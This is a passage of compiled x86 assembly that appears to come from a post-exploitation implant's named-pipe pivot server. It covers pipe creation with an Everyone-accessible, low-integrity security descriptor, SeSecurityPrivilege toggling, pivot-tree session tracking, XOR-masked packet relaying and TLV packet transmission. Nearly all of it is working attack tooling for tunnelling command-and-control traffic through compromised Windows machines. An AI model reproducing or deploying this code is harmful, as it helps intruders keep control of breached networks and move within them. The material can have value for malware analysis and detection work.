	movl	%eax, 4(%esp)
	movl	$LC17, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	addl	$312, %eax
	movl	%eax, -56(%ebp)
	movl	-56(%ebp), %eax
	addl	$15, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, %edx
	movl	-56(%ebp), %eax
	addl	$14, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -92(%ebp)
	movl	-56(%ebp), %eax
	addl	$13, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -96(%ebp)
	movl	-56(%ebp), %eax
	addl	$12, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -100(%ebp)
	movl	-56(%ebp), %eax
	addl	$11, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -104(%ebp)
	movl	-56(%ebp), %eax
	addl	$10, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -108(%ebp)
	movl	-56(%ebp), %eax
	addl	$9, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -112(%ebp)
	movl	-56(%ebp), %eax
	addl	$8, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -116(%ebp)
	movl	-56(%ebp), %eax
	addl	$7, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -120(%ebp)
	movl	-56(%ebp), %eax
	addl	$6, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -124(%ebp)
	movl	-56(%ebp), %eax
	addl	$5, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	-56(%ebp), %eax
	addl	$4, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	-56(%ebp), %eax
	addl	$3, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	-56(%ebp), %eax
	addl	$2, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	-56(%ebp), %eax
	addl	$1, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -128(%ebp)
	movl	-56(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%edx, 64(%esp)
	movl	-92(%ebp), %edx
	movl	%edx, 60(%esp)
	movl	-96(%ebp), %edx
	movl	%edx, 56(%esp)
	movl	-100(%ebp), %edx
	movl	%edx, 52(%esp)
	movl	-104(%ebp), %edx
	movl	%edx, 48(%esp)
	movl	-108(%ebp), %edx
	movl	%edx, 44(%esp)
	movl	-112(%ebp), %edx
	movl	%edx, 40(%esp)
	movl	-116(%ebp), %edx
	movl	%edx, 36(%esp)
	movl	-120(%ebp), %edx
	movl	%edx, 32(%esp)
	movl	-124(%ebp), %edx
	movl	%edx, 28(%esp)
	movl	%edi, 24(%esp)
	movl	%esi, 20(%esp)
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	-128(%ebp), %esi
	movl	%esi, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC18, (%esp)
	call	_real_dprintf
	movl	$16, 4(%esp)
	movl	$LC19, (%esp)
	call	_real_dprintf
	movl	$LC20, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	leal	312(%eax), %edx
	movl	$16, 8(%esp)
	movl	-52(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcpy
	movl	8(%ebp), %eax
	leal	312(%eax), %edx
	movl	8(%ebp), %eax
	movl	364(%eax), %eax
	movl	80(%eax), %eax
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_pivot_tree_remove
	movl	%eax, -60(%ebp)
	cmpl	$0, -60(%ebp)
	je	L28
	movl	$LC21, (%esp)
	call	_real_dprintf
	movl	-60(%ebp), %eax
	movl	8(%eax), %eax
	movl	%eax, (%esp)
	call	_free_server_context
	movl	-60(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	jmp	L28
L22:
	movl	$LC22, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	addl	$312, %eax
	movl	%eax, (%esp)
	movl	__imp__CoCreateGuid@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	8(%ebp), %eax
	movl	312(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__htonl@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	8(%ebp), %edx
	movl	%eax, 312(%edx)
	movl	8(%ebp), %eax
	movzwl	316(%eax), %eax
	movzwl	%ax, %eax
	movl	%eax, (%esp)
	movl	__imp__htons@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	8(%ebp), %edx
	movw	%ax, 316(%edx)
	movl	8(%ebp), %eax
	movzwl	318(%eax), %eax
	movzwl	%ax, %eax
	movl	%eax, (%esp)
	movl	__imp__htons@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	8(%ebp), %edx
	movw	%ax, 318(%edx)
	jmp	L24
L28:
	nop
L24:
	movl	8(%ebp), %eax
	movl	$1, 328(%eax)
	movl	$12, 4(%esp)
	movl	$1, (%esp)
	call	_calloc
	movl	%eax, -64(%ebp)
	movl	-64(%ebp), %eax
	movl	8(%ebp), %edx
	movl	%edx, 8(%eax)
	movl	-64(%ebp), %eax
	movl	$_named_pipe_write_raw, (%eax)
	movl	8(%ebp), %eax
	leal	312(%eax), %ecx
	movl	8(%ebp), %eax
	movl	364(%eax), %eax
	movl	80(%eax), %eax
	movl	-64(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	%ecx, 4(%esp)
	movl	%eax, (%esp)
	call	_pivot_tree_add
	movl	$LC23, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	364(%eax), %eax
	movl	80(%eax), %eax
	movl	%eax, (%esp)
	call	_dbgprint_pivot_tree
	movl	$LC24, (%esp)
	call	_real_dprintf
	movl	$34, 4(%esp)
	movl	$0, (%esp)
	call	_packet_create
	movl	%eax, -68(%ebp)
	movl	8(%ebp), %eax
	addl	$312, %eax
	movl	$16, 12(%esp)
	movl	%eax, 8(%esp)
	movl	$262606, 4(%esp)
	movl	-68(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_raw
	movl	8(%ebp), %eax
	addl	$296, %eax
	movl	$16, 12(%esp)
	movl	%eax, 8(%esp)
	movl	$262794, 4(%esp)
	movl	-68(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_raw
	movl	8(%ebp), %eax
	movl	364(%eax), %eax
	movl	$0, 8(%esp)
	movl	-68(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_packet_transmit
	movl	$0, -28(%ebp)
L21:
	movl	-44(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
L20:
	movl	8(%ebp), %eax
	movl	65928(%eax), %eax
	leal	-4(%eax), %ecx
	movl	-40(%ebp), %eax
	leal	4(%eax), %edx
	movl	-40(%ebp), %eax
	movl	%ecx, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_xor_bytes
L19:
	cmpl	$0, -28(%ebp)
	je	L25
	movl	8(%ebp), %eax
	movl	65924(%eax), %edx
	movl	8(%ebp), %eax
	movl	65928(%eax), %eax
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC25, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	364(%eax), %eax
	movl	4(%eax), %eax
	movl	36(%eax), %eax
	movl	8(%ebp), %edx
	movl	65928(%edx), %ebx
	movl	8(%ebp), %edx
	movl	65916(%edx), %ecx
	movl	8(%ebp), %edx
	movl	364(%edx), %edx
	movl	%ebx, 8(%esp)
	movl	%ecx, 4(%esp)
	movl	%edx, (%esp)
	call	*%eax
L25:
	movl	8(%ebp), %eax
	movl	65924(%eax), %edx
	movl	8(%ebp), %eax
	movl	65928(%eax), %eax
	subl	%eax, %edx
	movl	%edx, %eax
	movl	%eax, -72(%ebp)
	cmpl	$0, -72(%ebp)
	je	L26
	movl	-72(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC26, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	65916(%eax), %edx
	movl	8(%ebp), %eax
	movl	65928(%eax), %eax
	leal	(%edx,%eax), %ecx
	movl	8(%ebp), %eax
	movl	65916(%eax), %eax
	movl	-72(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	%ecx, 4(%esp)
	movl	%eax, (%esp)
	call	_memmove
L26:
	movl	$LC27, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	-72(%ebp), %edx
	movl	%edx, 65924(%eax)
	movl	8(%ebp), %eax
	movl	$0, 65928(%eax)
L18:
	movl	$0, %eax
	leal	-12(%ebp), %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
	.section .rdata,"dr"
	.align 4
LC28:
	.ascii "[NP-SERVER] Writing a total of %u\0"
LC29:
	.ascii "[NP-SERVER] Wrote %u\0"
	.align 4
LC30:
	.ascii "[NP-SERVER] failed to do the write\0"
LC31:
	.ascii "%s. error=%d (0x%x)\0"
LC32:
	.ascii "[NP-SERVER] left to go: %u\0"
	.align 4
LC33:
	.ascii "[NP SERVER] server write. finished. dwResult=%d, written=%d\0"
	.text
	.def	_named_pipe_write_raw;	.scl	3;	.type	32;	.endef
_named_pipe_write_raw:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	8(%ebp), %eax
	movl	%eax, -20(%ebp)
	movl	$0, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	-20(%ebp), %eax
	movl	65940(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC28, (%esp)
	call	_real_dprintf
	jmp	L30
L34:
	movl	$0, -24(%ebp)
	movl	-20(%ebp), %eax
	leal	20(%eax), %ecx
	movl	16(%ebp), %eax
	subl	-16(%ebp), %eax
	movl	%eax, %edx
	movl	-20(%ebp), %eax
	movl	368(%eax), %eax
	movl	%ecx, 16(%esp)
	movl	$0, 12(%esp)
	movl	%edx, 8(%esp)
	movl	12(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__WriteFile@20, %eax
	call	*%eax
	subl	$20, %esp
	movl	-20(%ebp), %eax
	leal	20(%eax), %ecx
	movl	-20(%ebp), %eax
	movl	368(%eax), %eax
	movl	$1, 12(%esp)
	leal	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	%ecx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__GetOverlappedResult@16, %eax
	call	*%eax
	subl	$16, %esp
	testl	%eax, %eax
	je	L31
	movl	-24(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC29, (%esp)
	call	_real_dprintf
	movl	-24(%ebp), %eax
	addl	%eax, -16(%ebp)
	jmp	L36
L31:
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$LC30, 4(%esp)
	movl	$LC31, (%esp)
	call	_real_dprintf
	jmp	L33
L36:
	movl	16(%ebp), %eax
	subl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC32, (%esp)
	call	_real_dprintf
L30:
	movl	-16(%ebp), %eax
	cmpl	16(%ebp), %eax
	jb	L34
L33:
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC33, (%esp)
	call	_real_dprintf
	movl	-20(%ebp), %eax
	movl	65940(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
	movl	-12(%ebp), %eax
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC34:
	.ascii "[NP-SERVER] AllocateAndInitializeSid failed: %u\0"
LC35:
	.ascii "[NP-SERVER] sidEveryone: %p\0"
	.align 4
LC36:
	.ascii "[NP-SERVER] SetEntriesInAclW failed: %u\0"
LC37:
	.ascii "[NP-SERVER] DACL: %p\0"
LC38:
	.ascii "[NP-SERVER] sidLow: %p\0"
	.align 4
LC39:
	.ascii "[NP-SERVER] InitializeAcl failed: %u\0"
	.align 4
LC40:
	.ascii "[NP-SERVER] AddMandatoryAce failed: %u\0"
	.align 4
LC41:
	.ascii "[NP-SERVER] InitializeSecurityDescriptor failed: %u\0"
	.align 4
LC42:
	.ascii "[NP-SERVER] SetSecurityDescriptorDacl failed: %u\0"
	.align 4
LC43:
	.ascii "[NP-SERVER] SetSecurityDescriptorSacl failed: %u\0"
	.text
	.globl	_create_pipe_security_attributes
	.def	_create_pipe_security_attributes;	.scl	2;	.type	32;	.endef
_create_pipe_security_attributes:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$136, %esp
	movl	$0, -26(%ebp)
	movw	$256, -22(%ebp)
	movl	$0, -32(%ebp)
	leal	-32(%ebp), %eax
	movl	%eax, 40(%esp)
	movl	$0, 36(%esp)
	movl	$0, 32(%esp)
	movl	$0, 28(%esp)
	movl	$0, 24(%esp)
	movl	$0, 20(%esp)
	movl	$0, 16(%esp)
	movl	$0, 12(%esp)
	movl	$0, 8(%esp)
	movl	$1, 4(%esp)
	leal	-26(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__AllocateAndInitializeSid@44, %eax
	call	*%eax
	subl	$44, %esp
	testl	%eax, %eax
	jne	L38
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC34, (%esp)
	call	_real_dprintf
	jmp	L37
L38:
	movl	-32(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC35, (%esp)
	call	_real_dprintf
	movl	$0, %ecx
	movl	$32, %eax
	andl	$-4, %eax
	movl	%eax, %edx
	movl	$0, %eax
L40:
	movl	%ecx, -64(%ebp,%eax)
	addl	$4, %eax
	cmpl	%edx, %eax
	jb	L40
	movl	$2097151, -64(%ebp)
	movl	$2, -60(%ebp)
	movl	$0, -56(%ebp)
	movl	$0, -44(%ebp)
	movl	$5, -40(%ebp)
	movl	-32(%ebp), %eax
	movl	%eax, -36(%ebp)
	movl	$0, -68(%ebp)
	leal	-68(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	$0, 8(%esp)
	leal	-64(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$1, (%esp)
	movl	__imp__SetEntriesInAclW@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	je	L42
	movl	-12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC36, (%esp)
	call	_real_dprintf
L42:
	movl	-68(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC37, (%esp)
	call	_real_dprintf
	movl	$0, -74(%ebp)
	movw	$4096, -70(%ebp)
	movl	$0, -80(%ebp)
	leal	-80(%ebp), %eax
	movl	%eax, 40(%esp)
	movl	$0, 36(%esp)
	movl	$0, 32(%esp)
	movl	$0, 28(%esp)
	movl	$0, 24(%esp)
	movl	$0, 20(%esp)
	movl	$0, 16(%esp)
	movl	$0, 12(%esp)
	movl	$4096, 8(%esp)
	movl	$1, 4(%esp)
	leal	-74(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__AllocateAndInitializeSid@44, %eax
	call	*%eax
	subl	$44, %esp
	testl	%eax, %eax
	jne	L43
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC34, (%esp)
	call	_real_dprintf
L43:
	movl	-68(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC38, (%esp)
	call	_real_dprintf
	movl	$256, 4(%esp)
	movl	$64, (%esp)
	movl	__imp__LocalAlloc@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	%eax, -16(%ebp)
	movl	$4, 8(%esp)
	movl	$256, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__InitializeAcl@12, %eax
	call	*%eax
	subl	$12, %esp
	testl	%eax, %eax
	jne	L44
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC39, (%esp)
	call	_real_dprintf
L44:
	movl	-80(%ebp), %eax
	movl	%eax, 16(%esp)
	movl	$0, 12(%esp)
	movl	$4, 8(%esp)
	movl	$4, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_AddMandatoryAce@20
	subl	$20, %esp
	testl	%eax, %eax
	jne	L45
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC40, (%esp)
	call	_real_dprintf
L45:
	movl	$20, 4(%esp)
	movl	$64, (%esp)
	movl	__imp__LocalAlloc@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	%eax, -20(%ebp)
	movl	$1, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__InitializeSecurityDescriptor@8, %eax
	call	*%eax
	subl	$8, %esp
	testl	%eax, %eax
	jne	L46
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC41, (%esp)
	call	_real_dprintf
L46:
	movl	-68(%ebp), %eax
	movl	$0, 12(%esp)
	movl	%eax, 8(%esp)
	movl	$1, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__SetSecurityDescriptorDacl@16, %eax
	call	*%eax
	subl	$16, %esp
	testl	%eax, %eax
	jne	L47
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC42, (%esp)
	call	_real_dprintf
L47:
	movl	$0, 12(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$1, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__SetSecurityDescriptorSacl@16, %eax
	call	*%eax
	subl	$16, %esp
	testl	%eax, %eax
	jne	L48
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC43, (%esp)
	call	_real_dprintf
L48:
	movl	8(%ebp), %eax
	movl	$12, (%eax)
	movl	8(%ebp), %eax
	movl	$0, 8(%eax)
	movl	8(%ebp), %eax
	movl	-20(%ebp), %edx
	movl	%edx, 4(%eax)
L37:
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC44:
	.ascii "[NP-PRIV] Couldn't open process token: %u (%x)\0"
	.align 4
LC45:
	.ascii "[NP-PRIV] Couldn't look up the value: %u (%x)\0"
	.align 4
LC46:
	.ascii "[NP-PRIV] Couldn't adjust the token privs: %u (%x)\0"
LC47:
	.ascii "enabled\0"
LC48:
	.ascii "disabled\0"
LC49:
	.ascii "\0"
LC50:
	.ascii "not \0"
	.align 4
LC51:
	.ascii "[NP-PRIV] the %S token was %senabled, and is now %s\0"
	.text
	.globl	_toggle_privilege
	.def	_toggle_privilege;	.scl	2;	.type	32;	.endef
_toggle_privilege:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%ebx
	subl	$84, %esp
	movl	__imp__GetCurrentProcess@0, %eax
	call	*%eax
	leal	-12(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	$40, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__OpenProcessToken@12, %eax
	call	*%eax
	subl	$12, %esp
	testl	%eax, %eax
	jne	L50
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, %ebx
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%ebx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC44, (%esp)
	call	_real_dprintf
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	jmp	L60
L50:
	leal	-52(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$0, (%esp)
	movl	__imp__LookupPrivilegeValueW@12, %eax
	call	*%eax
	subl	$12, %esp
	testl	%eax, %eax
	jne	L52
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, %ebx
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%ebx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC45, (%esp)
	call	_real_dprintf
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	jmp	L60
L52:
	movl	$1, -28(%ebp)
	movl	-52(%ebp), %eax
	movl	-48(%ebp), %edx
	movl	%eax, -24(%ebp)
	movl	%edx, -20(%ebp)
	cmpl	$0, 12(%ebp)
	je	L53
	movl	$2, %eax
	jmp	L54
L53:
	movl	$0, %eax
L54:
	movl	%eax, -16(%ebp)
	movl	-12(%ebp), %eax
	leal	-56(%ebp), %edx
	movl	%edx, 20(%esp)
	leal	-44(%ebp), %edx
	movl	%edx, 16(%esp)
	movl	$16, 12(%esp)
	leal	-28(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	$0, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__AdjustTokenPrivileges@24, %eax
	call	*%eax
	subl	$24, %esp
	testl	%eax, %eax
	jne	L55
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, %ebx
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%ebx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC46, (%esp)
	call	_real_dprintf
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	jmp	L60
L55:
	movl	-32(%ebp), %eax
	shrl	%eax
	andl	$1, %eax
	movl	%eax, %edx
	movl	16(%ebp), %eax
	movl	%edx, (%eax)
	cmpl	$0, 12(%ebp)
	je	L56
	movl	$LC47, %edx
	jmp	L57
L56:
	movl	$LC48, %edx
L57:
	movl	16(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	je	L58
	movl	$LC49, %eax
	jmp	L59
L58:
	movl	$LC50, %eax
L59:
	movl	%edx, 12(%esp)
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC51, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	$0, %eax
L60:
	movl	-4(%ebp), %ebx
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC52:
	.ascii "[NP-SERVER] Creating new server instance of %s\0"
LC53:
	.ascii "SeSecurityPrivilege\0"
	.align 4
LC54:
	.ascii "[NP-SERVER] Failed to create named pipe.\0"
	.align 4
LC55:
	.ascii "[NP-SERVER] Creating the handler event\0"
	.align 4
LC56:
	.ascii "[NP-SERVER] Failed to create connect event for read overlap.\0"
	.align 4
LC57:
	.ascii "[NP-SERVER] Inserting the named pipe schedule entry\0"
	.text
	.globl	_create_pipe_server_instance
	.def	_create_pipe_server_instance;	.scl	2;	.type	32;	.endef
_create_pipe_server_instance:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$72, %esp
	movl	$0, -12(%ebp)
	movl	8(%ebp), %eax
	addl	$40, %eax
	movl	%eax, 4(%esp)
	movl	$LC52, (%esp)
	call	_real_dprintf
	leal	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$1, 4(%esp)
	movl	$LC53, (%esp)
	call	_toggle_privilege
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L62
	movl	$0, -32(%ebp)
	movl	$0, -28(%ebp)
	movl	$0, -24(%ebp)
	leal	-32(%ebp), %eax
	movl	%eax, (%esp)
	call	_create_pipe_security_attributes
	movl	8(%ebp), %eax
	leal	40(%eax), %edx
	leal	-32(%ebp), %eax
	movl	%eax, 28(%esp)
	movl	$0, 24(%esp)
	movl	$65536, 20(%esp)
	movl	$65536, 16(%esp)
	movl	$255, 12(%esp)
	movl	$0, 8(%esp)
	movl	$1073741827, 4(%esp)
	movl	%edx, (%esp)
	movl	__imp__CreateNamedPipeA@32, %eax
	call	*%eax
	subl	$32, %esp
	movl	8(%ebp), %edx
	movl	%eax, 368(%edx)
	movl	-20(%ebp), %eax
	testl	%eax, %eax
	jne	L62
	leal	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	$LC53, (%esp)
	call	_toggle_privilege
L62:
	movl	8(%ebp), %eax
	movl	368(%eax), %eax
	cmpl	$-1, %eax
	jne	L64
	movl	8(%ebp), %eax
	addl	$40, %eax
	movl	$0, 28(%esp)
	movl	$0, 24(%esp)
	movl	$65536, 20(%esp)
	movl	$65536, 16(%esp)
	movl	$255, 12(%esp)
	movl	$0, 8(%esp)
	movl	$1073741827, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__CreateNamedPipeA@32, %eax
	call	*%eax
	subl	$32, %esp
	movl	8(%ebp), %edx
	movl	%eax, 368(%edx)
L64:
	movl	8(%ebp), %eax
	movl	368(%eax), %eax
	cmpl	$-1, %eax
	jne	L65
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$LC54, 4(%esp)
	movl	$LC31, (%esp)
	call	_real_dprintf
	jmp	L69
L65:
	movl	$LC55, (%esp)
	call	_real_dprintf
	movl	$0, 12(%esp)
	movl	$1, 8(%esp)
	movl	$1, 4(%esp)
	movl	$0, (%esp)
	movl	__imp__CreateEventA@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	8(%ebp), %edx
	movl	%eax, 16(%edx)
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	testl	%eax, %eax
	jne	L67
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$LC56, 4(%esp)
	movl	$LC31, (%esp)
	call	_real_dprintf
	jmp	L69
L67:
	movl	$0, 12(%esp)
	movl	$0, 8(%esp)
	movl	$1, 4(%esp)
	movl	$0, (%esp)
	movl	__imp__CreateEventA@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	8(%ebp), %edx
	movl	%eax, 36(%edx)
	movl	8(%ebp), %eax
	movl	36(%eax), %eax
	testl	%eax, %eax
	jne	L68
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$LC56, 4(%esp)
	movl	$LC31, (%esp)
	call	_real_dprintf
	jmp	L69
L68:
	movl	$LC57, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	movl	$_server_destroy, 16(%esp)
	movl	$_server_notify, 12(%esp)
	movl	$0, 8(%esp)
	movl	8(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_scheduler_insert_waitable
L69:
	movl	-12(%ebp), %eax
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC58:
	.ascii "[NP-SERVER] free_server_context. ctx=0x%08X\0"
	.align 4
LC59:
	.ascii "[NP-SERVER] freeing up pipe handle 0x%x\0"
	.align 4
LC60:
	.ascii "[NP-SERVER] free_server_context. signaling the thread to stop\0"
	.text
	.def	_free_server_context;	.scl	3;	.type	32;	.endef
_free_server_context:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	cmpl	$0, 8(%ebp)
	je	L78
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC58, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	368(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC59, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	368(%eax), %eax
	cmpl	$-1, %eax
	je	L74
	movl	8(%ebp), %eax
	movl	368(%eax), %eax
	cmpl	$-1, %eax
	je	L74
	movl	8(%ebp), %eax
	movl	368(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	8(%ebp), %eax
	movl	$-1, 368(%eax)
L74:
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	testl	%eax, %eax
	je	L75
	movl	$LC60, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	movl	$3, 4(%esp)
	movl	%eax, (%esp)
	call	_scheduler_signal_waitable
	movl	8(%ebp), %eax
	movl	$0, 16(%eax)
L75:
	movl	8(%ebp), %eax
	movl	36(%eax), %eax
	testl	%eax, %eax
	je	L76
	movl	8(%ebp), %eax
	movl	36(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	8(%ebp), %eax
	movl	$0, 36(%eax)
L76:
	movl	8(%ebp), %eax
	movl	65916(%eax), %eax
	testl	%eax, %eax
	je	L77
	movl	8(%ebp), %eax
	movl	65916(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	8(%ebp), %eax
	movl	$0, 65916(%eax)
L77:
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	jmp	L79
L78:
	nop
L79:
	nop
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC61:
	.ascii "[NP-SERVER] server_notify. serverCtx == NULL\0"
	.align 4
LC62:
	.ascii "[NP-SERVER] pipe isn't present, we might be shutting down.\0"
	.align 4
LC63:
	.ascii "[NP-SERVER] Connecting to the named pipe async\0"
	.align 4
LC64:
